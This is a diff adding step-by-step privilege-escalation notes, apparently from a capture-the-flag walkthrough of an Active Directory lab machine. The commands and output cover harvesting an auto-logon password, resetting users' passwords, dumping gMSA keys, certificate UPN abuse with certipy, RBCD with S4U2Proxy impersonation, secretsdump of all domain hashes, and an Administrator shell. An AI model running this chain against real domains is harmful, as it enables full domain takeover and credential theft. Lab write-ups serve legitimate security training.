@@ -418,11 +418,158 @@ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547
 
 
 
-
-
-
-
-
-
-
 type C:\Users\Administrator\Desktop\root.txt
+
+
+
+
+-----------------------------------------------------------------------------------------
+PRIV ESCA:
+
+10. In evil, search for auto-login system with the next 4 fields:
+ Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
+
+If those are legit and the AutoAdminLogon = 1  then you will get the plaintext password from DefaultPassowrd:
+DefaultUserName DefaultDomainName DefaultPassword AutoAdminLogon
+--------------- ----------------- --------------- --------------
+mar...nd      MI..E            1da....ime      1
+
+
+12. set this as owned in bloodhound, so you see more connections now.
+
+ 
+13. You can change his password since you have your tgt ticket 
+ bloodyAD --kerberos -u "mar....ond" -p "1d....ime" -d "mir....htb" --host "dc01.mira...htb" set password "javier...all" 'Newp@ssw0rd'
+ 
+If thiss fails then:
+
+14. at evil-winrm:
+Create a powershell credencial object with mar...nd user. With him you enable-ADAccount for user javi....ll.
+Thats why, javi...ll was disabled. And now is enabled from an legit user.
+Then you need to extract the LogonHours from mar...nd, which defines for how many hours he can login. (24/7)
+And we put them to jav...ll too.
+
+
+$Password = ConvertTo-SecureString "1da...ime" -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential ("MI...GE\mar...nd", $Password)
+Enable-ADAccount -Identity javi....shall -Cred $Cred
+ 
+$logonhours = Get-ADUser mar....ond -Properties LogonHours | select-object -expand logonhours
+[byte[]]$hours1 = $logonhours
+Set-ADUser -Identity javi....shall -Cred $Cred -Replace @{logonhours = $hours1}
+
+
+
+15. Then we ca nchange his password too
+ bloodyAD --kerberos -u "mar....ond" -p "1da....ime" -d "mir....htb" --host "dc01.mir...htb" set password "javie....rshall" 'Newp@ssw0rd'
+[+] Password changed successfully!
+
+16. Take a ticket for hime too and export it
+ impacket-getTGT MIRAGE.HTB/javier.mmarshall:'Newp@ssw0rd' -dc-ip 10.10.11.78
+
+[*] Saving ticket in javier.mmarshall.ccache
+exprot it 
+klist
+
+17. Then try to find the keys for encryption-decryption from GMSA-->Group Managed Service Accounts
+git clone https://github.com/micahvandeusen/gMSADumper
+cd 
+python3 gMSADumper.py -k -d mir....htb -l dc01.mira....htb
+Users or groups who can read password for Mirag...vice$:
+ > javie....rshall
+Mirag....vice$:::305806d84f7c........0f0c7866
+Mirag....vice$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9........cb9987705e462d9491c0482ae
+Mirag....vice$:aes128-cts-hmac-sha1-96:ff1d75e3a880.......b8e3ff17dd
+
+18. Put jav... as owned in bloodhound and study the new connections
+
+19. Now you can take a ticket for Mir...service$
+ impacket-getTGT mir....htb/Mira...rvice\$ -aesKey 80bada65a4f84fb900....462d9491c0482ae -dc-ip 10.10.XX.XX
+
+export it
+klist
+
+
+
+
+(You dont need to change manually the ccache every time, before you commands put something like: 
+KRB5CCNAME=Mirage-Service$.ccache   certipy......)
+
+
+20. now you need to change the attributes of mark... to has some more preveleges in a new template!
+(export Mira...erv$ ticket and then:)
+certipy-ad account -u 'Mira...rvice$' -k -target dc01.mira...htb -upn 'dc01$@mira....htb' -user 'mar...ond' update
+....
+....
+[*] Updating user 'mar...bond':
+    userPrincipalName                   : dc01$@mira....htb
+[*] Successfully updated 'mark...bond'
+
+
+
+21. Then with mark...nd's ticket this time (export it) request a new user template. He now has a certificate X.509 that he ca nuse to authenticate himself. 
+ certipy-ad req -k -target dc01.mir...htb -ca 'mir...e-DC01-CA' -tamplate 'User' -dc-ip 10.10.XX.XX
+
+                                                    
+22. again updates the mark.. and adds to him the UPN=.... for UPN mapping to his certificate. (User Principal Name, its the email address of a user, like mark@10.10.XX.XX)
+ certipy-ad account -u 'Mirag...rvice$' -k -target dc01.mira...htb -upn 'mark....nd@mir...htb' -user 'ma...bond' update -dc-ip 10.10.XX.XX
+
+[*] Successfully updated 'mar...d'
+                                                                                                             
+
+
+23. You now get full access in AD through LDAP after you used the certificate .pfx for authentication
+certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
+
+[*] Certificate identities:
+[*]     SAN UPN: 'dc01$@mira...htb'
+[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
+[*] Connecting to 'ldaps://10.10.xx.xx:636'
+[*] Authenticated to '10.10.11.78' as: 'u:MIR...E\\DC01$'
+Type help for list of commands
+
+# whoami
+u:MI...E\DC01$
+
+24. In this ldap shell (dc01$), you need to give RBCD privelages to Mir...vice$
+RBCD=Resource-Based Constrained Delegation
+So the Mira...vice$ will be able to impersonate (adiprosopevei??) all the users to the dco1$ threw S4U2Proxy.
+
+# set_rbcd dc01$ Mirage-Service$
+Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
+Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000
+
+Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
+Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
+Delegation rights modified successfully!
+Mirage-Service$ can now impersonate users on dc01$ via S4U2Proxy
+
+# Bye!
+
+
+25. Now you need to do the impersonation attack with th getST script, which creates Service Tickets for the name of user (dc01$), using the account from someone that can impersonate(mir..serv)
+So, -spn --> you ask for ticket access from CIFS service from dc01
+You impersonate that you are dc01$   (the computer account of DC)
+'mir..htb/Mira..vice$' --> the account Service Account where you login with the ticket
+and at the end is the NTLM hash from mira...vice$
+
+
+ impacket-getST -spn 'CIFS/dc01.mira...htb' -impersonate 'dc01$' -dc-ip 10.10.xx.xx 'mira...htb/Mira...rvice$' -hashes :305806d84.....0f0c7866
+and export the ticket for dc01@CIFS_dc01.mir..htb@MIR..HTB.ccache
+export KRB5CCNAME=dc01\$@CIFS_dc01.mira...htb@MIRA....HTB.ccache
+
+
+26.
+impacket-secretsdump -k -no-pass dc01.mirage.htb
+
+getting all the pass hashes!
+
+
+27. Use the administrators aes256 hash to get a kerb ticket:
+ impacket-getTGT mir....htb/Administrator -aesKey 09454bbc6da252ac9......8da5406ad0bce4bdca7
+
+export it
+klist
+
+28. evil-winrm -i dc01.mira...htb -r mir....htb 
+you in:)
